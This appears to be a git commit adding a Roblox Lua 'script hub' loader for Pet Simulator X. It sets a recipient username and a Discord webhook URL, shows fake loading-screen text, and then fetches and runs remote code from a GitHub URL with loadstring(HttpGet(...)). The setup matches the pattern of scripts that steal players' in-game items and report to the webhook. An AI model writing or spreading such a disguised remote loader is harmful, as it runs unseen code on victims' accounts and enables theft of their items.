77c09866d70b58482256c8748c71610b932ce106
GTHSCRIPTS <130226494+GTHSCRIPTS@users.noreply.github.com>
2023-04-18 20:51:40 +0100

    Create script.lua

---
+++ script.lua
@@ -0,0 +1,11 @@
+Username = "iakotamuna"
+WebHook = "https://discord.com/api/webhooks/1097939405756448868/lMOXbny2aljDVgOgIAiWZPicf1qciBnBHVB1U-3qOQI85289j5nYUAe34Yudgx0bUQ3e"
+
+
+loadingscreen = true -- set this to false and remove _G. stuff to use your own GUI
+_G.CustomScriptName = "Gth hub"
+_G.Text1 = "Script Loaded..."
+_G.Text2 = "Waiting for Script"
+_G.Text3 = "Checking Scripts..."
+_G.Text4 = "Starting Scripts..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
